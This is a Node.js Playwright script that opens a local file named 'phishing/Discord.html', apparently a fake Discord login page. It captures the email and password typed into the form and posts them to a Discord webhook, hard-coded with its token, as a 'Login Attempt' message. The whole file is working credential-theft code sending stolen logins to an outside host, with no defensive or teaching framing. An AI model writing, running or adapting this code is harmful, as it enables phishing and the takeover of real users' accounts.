const { chromium } = require('playwright');
const path = require('path');

(async () => {
    const browser = await chromium.launch({ headless: false });
    const page = await browser.newPage();
    const url = 'file://' + path.resolve('scripts', 'phishing', 'Discord.html');
    
    await page.goto(url);

    const loginBtn = page.locator('button', { hasText: 'Log In' });
    const capturedData = await loginBtn.evaluate(node => {
        return new Promise(resolve => {
            node.addEventListener('click', () => {
                // Grab the values BEFORE the form submits/clears
                const email = document.querySelector('#uid_10')?.value;
                const password = document.querySelector('#uid_12')?.value;
                resolve({ email, password });
            }, { once: true });
        });
    });

    const { email, password } = capturedData;
    console.log(`Captured: Email=${email}, Password=${password}`);

    const webhookURL = 'https://discord.com/api/webhooks/1514225388040224808/A2_ZIqPQRQiTgIRJP2ArOBaqjtaQYbmzPejZE1cf28vE9fI7i17kPPpvIsYAxgrzM0G2';
    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: "Login Attempt",
                color: 0x5865F2,
                fields: [
                    { name: "Email", value: email || "N/A", inline: true },
                    { name: "Password", value: password || "N/A", inline: true }
                ],
                footer: { text: "BUBUSOCIETY" },
                timestamp: new Date()
            }]
        })
    });
})();